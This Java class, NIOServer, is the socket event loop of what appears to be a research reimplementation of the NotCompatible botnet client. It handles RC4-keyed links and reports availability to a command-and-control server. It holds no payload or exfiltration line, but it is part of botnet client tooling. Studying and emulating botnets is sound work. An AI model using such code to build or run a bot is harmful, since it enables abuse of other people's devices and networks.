package diff.notcompatible.c.bot.net;

import java.io.IOException;
import java.net.ConnectException;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.util.Iterator;
import java.util.logging.Logger;

import diff.notcompatible.c.bot.net.tcp.Link;
import diff.notcompatible.c.bot.objects.List;

public class NIOServer {

    private final static Logger LOGGER = Logger.getLogger("session");

    private List connectionList;
    public long lastCheck;
    public Selector selector;

    public NIOServer() throws IOException {
        lastCheck = 0L;
        connectionList = new List();
        System.setProperty("java.net.preferIPv6Addresses", "false");
        selector = Selector.open();
    }

    // TODO : Ewww clean up
    public int DispQuery() throws IOException {
        int extraTimeout = 0;
        checktimeout();
        int r = selector.select(5000 + extraTimeout);
        if (r > -1) {
            Iterator<SelectionKey> selectedKeys = selector.selectedKeys().iterator();
            while (selectedKeys.hasNext()) {
                SelectionKey key = selectedKeys.next();
                selectedKeys.remove();
                try {
                    // Only work on valid keys
                    if (key.isValid()) {
                        // Do connect
                        if (key.isConnectable()) {
                            ((SocketChannel) key.channel()).finishConnect();
                            if (((SocketChannel) key.channel()).isConnected()) {
                                CustomSocket cs = (CustomSocket) key.attachment();
                                key.interestOps(1);
                                cs.onConnect(key);
                                unregister(cs);
                            }
                            // Or read
                        } else if (key.isReadable()) {
                            // This is a bit of a hack, but apparently the server is slow in
                            // coughing up the rc4 so we need to stall and wait a little
                            if (key.attachment().getClass() == Link.class) {
                                if (((Link) key.attachment()).firstRead) {
                                    Thread.sleep(1000L);
                                    ((Link) key.attachment()).firstRead = false;
                                }
                            }
                            ((CustomSocket) key.attachment()).onRead(key);
                            // Or write
                        } else if (key.isWritable()) {
                            ((CustomSocket) key.attachment()).onWrite(key);
                            // Or accepting
                        } else if (key.isAcceptable()) {
                            ((CustomSocket) key.attachment()).onAccept(key);
                        }
                    }
                } catch (ConnectException exception) {
                    LOGGER.warning(" [*] Connection exception : [ " + exception.getMessage() + " ] ");
                    LOGGER.throwing(NIOServer.class.toString(), "DispQuery", exception);
                } catch (Exception exception) {
                    LOGGER.throwing(NIOServer.class.toString(), "DispQuery", exception);
                    exception.printStackTrace();
                    ((CustomSocket) key.attachment()).onClose(key);
                    key.cancel();
                }
            }
        }
        return r;
    }

    /**
     * Check if socket potentially timed out, or if we should send a NoConnect to C&C
     */
    public void checktimeout() {
        long currentTime = System.currentTimeMillis();
        // Esnure we aren't being spammy
        if ((lastCheck + 5000) < currentTime) {
            lastCheck = currentTime;
            for (int i = 0; i < connectionList.count; i++) {
                CustomSocket customSocket = (CustomSocket) connectionList.getObject(i);
                if ((currentTime - customSocket.time_start_connection) > 5000) {
                    unregister(customSocket);
                    try {
                        // Send C&C NoConnection (I'm available!)
                        customSocket.onNoConnect(null);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

    public void register(CustomSocket customSocket) {
        customSocket.time_start_connection = System.currentTimeMillis();
        connectionList.add(customSocket);
    }

    public void unregister(CustomSocket customSocket) {
        connectionList.delete(customSocket);
        customSocket.time_start_connection = 0;
    }

}
